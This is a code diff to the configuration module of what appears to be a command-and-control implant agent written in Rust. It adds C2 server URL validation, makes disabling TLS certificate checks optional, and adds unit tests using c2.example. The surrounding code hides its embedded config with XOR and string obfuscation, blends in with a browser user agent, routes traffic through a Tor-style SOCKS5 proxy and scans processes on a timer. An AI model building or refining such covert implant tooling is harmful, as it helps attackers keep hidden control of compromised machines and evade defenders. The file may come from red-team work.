@@ -1,11 +1,11 @@
+use log::{error, info, warn};
+use obfstr::obfstr;
+use reqwest::{Client, Proxy, Url};
 use serde::{Deserialize, Serialize};
+use std::env;
 use std::fs;
 use std::io;
 use std::path::Path;
-use std::env;
-use log::{info, warn, error};
-use reqwest::{Client, Proxy};
-use obfstr::obfstr;
 
 // Include the generated config file
 include!(concat!(env!("OUT_DIR"), "/config.rs"));
@@ -13,17 +13,66 @@ include!(concat!(env!("OUT_DIR"), "/config.rs"));
 // Helper function to deobfuscate the config
 fn deobfuscate_config(hex_content: &str, key_str: &str) -> Result<String, String> {
     let key_bytes = key_str.as_bytes();
+    if key_bytes.is_empty() {
+        return Err("Config XOR key cannot be empty".to_string());
+    }
+    if (hex_content.len() & 1) != 0 {
+        return Err("Invalid hex string length".to_string());
+    }
+
     let mut obfuscated_bytes = Vec::new();
-    for i in (0..hex_content.len()).step_by(2) {
-        let byte_str = hex_content.get(i..i+2).ok_or_else(|| "Invalid hex string length".to_string())?;
-        let byte = u8::from_str_radix(byte_str, 16).map_err(|e| format!("Invalid hex character: {}", e))?;
+    for chunk in hex_content.as_bytes().chunks_exact(2) {
+        let byte_str =
+            std::str::from_utf8(chunk).map_err(|e| format!("Invalid hex encoding: {}", e))?;
+        let byte = u8::from_str_radix(byte_str, 16)
+            .map_err(|e| format!("Invalid hex character: {}", e))?;
         obfuscated_bytes.push(byte);
     }
 
     for (i, byte) in obfuscated_bytes.iter_mut().enumerate() {
         *byte ^= key_bytes[i % key_bytes.len()];
     }
-    String::from_utf8(obfuscated_bytes).map_err(|e| format!("Deobfuscated config is not valid UTF-8: {}", e))
+    String::from_utf8(obfuscated_bytes)
+        .map_err(|e| format!("Deobfuscated config is not valid UTF-8: {}", e))
+}
+
+pub fn validate_http_url(raw_url: &str) -> Result<Url, String> {
+    let url = Url::parse(raw_url).map_err(|e| format!("Invalid URL '{}': {}", raw_url, e))?;
+
+    match url.scheme() {
+        "http" | "https" => {}
+        scheme => {
+            return Err(format!(
+                "Unsupported URL scheme '{}'; expected http or https",
+                scheme
+            ))
+        }
+    }
+
+    if url.host_str().is_none() {
+        return Err("URL must include a host".to_string());
+    }
+
+    Ok(url)
+}
+
+pub fn validate_c2_base_url(raw_url: &str) -> Result<Url, String> {
+    let url = validate_http_url(raw_url)?;
+
+    if !url.username().is_empty() || url.password().is_some() {
+        return Err("C2 base URL must not include credentials".to_string());
+    }
+    if url.query().is_some() || url.fragment().is_some() {
+        return Err("C2 base URL must not include query strings or fragments".to_string());
+    }
+
+    Ok(url)
+}
+
+pub fn same_origin(left: &Url, right: &Url) -> bool {
+    left.scheme() == right.scheme()
+        && left.host_str() == right.host_str()
+        && left.port_or_known_default() == right.port_or_known_default()
 }
 
 #[derive(Serialize, Deserialize, Clone, Debug)]
@@ -39,6 +88,8 @@ pub struct AgentConfig {
     pub socks5_host: String,
     #[serde(default = "default_socks5_port")]
     pub socks5_port: u16,
+    #[serde(default)]
+    pub allow_invalid_certs: bool,
     #[serde(default = "default_proc_scan_interval")]
     pub proc_scan_interval_secs: u64,
     #[serde(default = "default_user_agent")]
@@ -75,7 +126,9 @@ fn default_socks5_port() -> u16 {
     9050
 }
 
-fn default_proc_scan_interval() -> u64 { 300 }
+fn default_proc_scan_interval() -> u64 {
+    300
+}
 
 fn default_user_agent() -> String {
     // Use a common browser user agent as default
@@ -137,6 +190,7 @@ impl Default for AgentConfig {
             socks5_enabled: false,
             socks5_host: obfstr!("127.0.0.1").to_string(),
             socks5_port: 9050,
+            allow_invalid_certs: false,
             proc_scan_interval_secs: default_proc_scan_interval(),
             user_agent: default_user_agent(),
             base_score_threshold_bg_to_reduced: default_base_score_threshold_bg_to_reduced(),
@@ -168,17 +222,17 @@ impl AgentConfig {
                 } else {
                     warn!("[WARNING] Failed to parse deobfuscated embedded config");
                 }
-            },
+            }
             Err(e) => {
                 warn!("[WARNING] Failed to deobfuscate embedded config: {}", e);
             }
         }
-        
+
         // Try filesystem config as fallback
         if let Ok(exe_path) = env::current_exe() {
             let exe_dir = exe_path.parent().unwrap_or(Path::new("."));
             let config_path = exe_dir.join(".config").join("config.json");
-            
+
             if config_path.exists() {
                 if let Ok(contents) = fs::read_to_string(&config_path) {
                     if let Ok(config) = serde_json::from_str::<AgentConfig>(&contents) {
@@ -191,7 +245,10 @@ impl AgentConfig {
         }
 
         // No valid config found
-        Err(io::Error::new(io::ErrorKind::NotFound, "No valid configuration found"))
+        Err(io::Error::new(
+            io::ErrorKind::NotFound,
+            "No valid configuration found",
+        ))
     }
 
     pub fn get_server_url(&self) -> String {
@@ -202,25 +259,42 @@ impl AgentConfig {
         }
     }
 
+    pub fn get_validated_server_url(&self) -> Result<Url, String> {
+        validate_c2_base_url(&self.get_server_url())
+    }
+
     /// Build an HTTP client that respects the SOCKS5 proxy config and logs the proxy status.
     pub fn build_http_client(&self) -> Result<Client, io::Error> {
-        let builder = Client::builder()
-            .user_agent(self.user_agent.clone())
-            .danger_accept_invalid_certs(true);
+        let mut builder = Client::builder().user_agent(self.user_agent.clone());
+
+        if self.allow_invalid_certs {
+            warn!("[HTTP] TLS certificate verification is disabled by agent config");
+            builder = builder.danger_accept_invalid_certs(self.allow_invalid_certs);
+        }
 
         if self.socks5_enabled {
             let proxy_url = format!("socks5h://{}:{}", self.socks5_host, self.socks5_port);
-            info!("[HTTP] Building HTTP client with SOCKS5 proxy: {}", proxy_url);
+            info!(
+                "[HTTP] Building HTTP client with SOCKS5 proxy: {}",
+                proxy_url
+            );
             match builder
                 .proxy(Proxy::all(&proxy_url).map_err(|e| {
                     error!("[HTTP] Invalid proxy URL: {}", e);
                     io::Error::new(io::ErrorKind::Other, format!("Invalid proxy URL: {}", e))
                 })?)
-                .build() {
+                .build()
+            {
                 Ok(client) => Ok(client),
                 Err(e) => {
-                    error!("[HTTP] Failed to build HTTP client with SOCKS5 proxy: {}", e);
-                    Err(io::Error::new(io::ErrorKind::Other, format!("Failed to build HTTP client with proxy: {}", e)))
+                    error!(
+                        "[HTTP] Failed to build HTTP client with SOCKS5 proxy: {}",
+                        e
+                    );
+                    Err(io::Error::new(
+                        io::ErrorKind::Other,
+                        format!("Failed to build HTTP client with proxy: {}", e),
+                    ))
                 }
             }
         } else {
@@ -229,5 +303,70 @@ impl AgentConfig {
                 .build()
                 .map_err(|e| io::Error::new(io::ErrorKind::Other, e))
         }
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn validates_configured_server_urls() -> Result<(), String> {
+        let direct = AgentConfig {
+            server_url: "https://c2.example:8443".to_string(),
+            ..Default::default()
+        };
+        assert_eq!(
+            direct.get_validated_server_url()?.as_str(),
+            "https://c2.example:8443/"
+        );
+
+        let with_protocol = AgentConfig {
+            server_url: "c2.example:8443".to_string(),
+            protocol: "https".to_string(),
+            ..Default::default()
+        };
+        assert_eq!(
+            with_protocol.get_validated_server_url()?.as_str(),
+            "https://c2.example:8443/"
+        );
+
+        Ok(())
+    }
+
+    #[test]
+    fn rejects_unsupported_c2_base_urls() {
+        for raw_url in [
+            "file:///tmp/config",
+            "ftp://c2.example",
+            "https://user:pass@c2.example",
+            "https://c2.example/path?token=1",
+            "https://c2.example/path#fragment",
+        ] {
+            assert!(
+                validate_c2_base_url(raw_url).is_err(),
+                "{} should be rejected",
+                raw_url
+            );
+        }
+    }
+
+    #[test]
+    fn compares_url_origins() -> Result<(), String> {
+        let left = validate_http_url("https://c2.example/path")?;
+        let same = validate_http_url("https://c2.example/other")?;
+        let different = validate_http_url("http://c2.example/path")?;
+
+        assert!(same_origin(&left, &same));
+        assert!(!same_origin(&left, &different));
+
+        Ok(())
+    }
+
+    #[test]
+    fn deobfuscate_config_rejects_invalid_inputs() {
+        assert!(deobfuscate_config("f", "k").is_err());
+        assert!(deobfuscate_config("zz", "k").is_err());
+        assert!(deobfuscate_config("00", "").is_err());
     }
 }
